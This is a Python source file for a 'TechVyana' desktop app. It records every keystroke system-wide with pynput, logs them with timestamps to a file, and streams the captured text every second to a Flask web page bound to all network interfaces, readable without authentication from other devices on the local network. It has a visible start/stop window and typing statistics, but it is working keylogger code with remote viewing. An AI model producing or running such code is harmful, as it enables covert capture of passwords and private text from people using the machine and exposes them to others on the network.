import tkinter as tk
from pynput.keyboard import Key, Listener
from datetime import datetime
import threading
import time
import socket

# -------- FLASK SERVER --------
from flask import Flask, request, jsonify

app = Flask(__name__)
received_text = ""

@app.route("/")
def home():
    return f"""
    <h1 style='color:lime;background:black;padding:10px'>TechVyana Live</h1>
    <pre style='color:lime;background:black;padding:10px'>{received_text}</pre>
    """

@app.route("/receive", methods=["POST"])
def receive():
    global received_text
    data = request.get_json()
    received_text = data.get("keyboardData", "")
    return jsonify({"status": "ok"})

def start_server():
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)

# -------- GET LOCAL IP --------
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

# -------- MAIN APP --------
import requests
import json

caps_on = False
shift_on = False
running = False

LOG_FILE = "log.txt"
text_buffer = ""

# -------- STATS --------
start_time = None
key_count = 0

def write_log(text):
    with open(LOG_FILE, "a") as f:
        f.write(text)

# -------- AUTO SEND --------
def auto_send():
    global text_buffer
    try:
        payload = json.dumps({"keyboardData": text_buffer})
        requests.post(
            "http://127.0.0.1:5000/receive",
            data=payload,
            headers={"Content-Type": "application/json"}
        )
    except:
        pass
    root.after(1000, auto_send)

# -------- STATS --------
def update_stats():
    if start_time:
        elapsed = time.time() - start_time
        wpm = (len(text_buffer) / 5) / (elapsed / 60) if elapsed > 0 else 0
        stats_label.config(text=f"Keys: {key_count} | WPM: {int(wpm)}")
    root.after(1000, update_stats)

# -------- KEY HANDLER --------
def on_press(key):
    global caps_on, shift_on, text_buffer, key_count

    if not running:
        return

    try:
        char = key.char
        char = char.upper() if (caps_on ^ shift_on) else char.lower()
        output = char
    except:
        if key == Key.space:
            output = " "
        elif key == Key.enter:
            output = "\n"
        elif key == Key.caps_lock:
            caps_on = not caps_on
            return
        elif key in (Key.shift, Key.shift_r):
            shift_on = True
            return
        elif key == Key.backspace:
            try:
                text_area.delete("end-2c")
                text_buffer = text_buffer[:-1]
                key_count -= 1
            except:
                pass
            return
        else:
            return

    text_area.insert(tk.END, output)
    text_area.see(tk.END)

    timestamp = datetime.now().strftime("%H:%M:%S ")
    write_log(timestamp + output + "\n")

    text_buffer += output
    key_count += 1

def on_release(key):
    global shift_on
    if key in (Key.shift, Key.shift_r):
        shift_on = False
    if key == Key.esc:
        stop_logging()

# -------- CONTROLS --------
def start_logging():
    global running, start_time, key_count
    running = True
    start_time = time.time()
    key_count = 0
    status_label.config(text="RUNNING", fg="lime")

def stop_logging():
    global running
    running = False
    status_label.config(text="STOPPED", fg="red")

# -------- LISTENER --------
def start_listener():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# -------- UI --------
root = tk.Tk()
root.title("TechVyana 2.0 AUTO SERVER")
root.geometry("800x550")
root.configure(bg="black")

tk.Label(root, text="TECHVYANA 3.0", fg="lime", bg="black",
         font=("Consolas", 20, "bold")).pack()

status_label = tk.Label(root, text="STOPPED", fg="red", bg="black")
status_label.pack()

stats_label = tk.Label(root, text="Keys: 0 | WPM: 0", fg="cyan", bg="black")
stats_label.pack()

text_area = tk.Text(root, bg="black", fg="lime", insertbackground="lime")
text_area.pack(expand=True, fill="both")

frame = tk.Frame(root, bg="black")
frame.pack()

tk.Button(frame, text="START", command=start_logging, bg="green").grid(row=0, column=0, padx=5)
tk.Button(frame, text="STOP", command=stop_logging, bg="red").grid(row=0, column=1, padx=5)

# -------- START EVERYTHING --------
threading.Thread(target=start_listener, daemon=True).start()
threading.Thread(target=start_server, daemon=True).start()

update_stats()
auto_send()

# -------- PRINT LINKS --------
local_ip = get_local_ip()

print("Open on PC: http://127.0.0.1:5000")
print(f"Open on Phone: http://{local_ip}:5000")

root.mainloop()
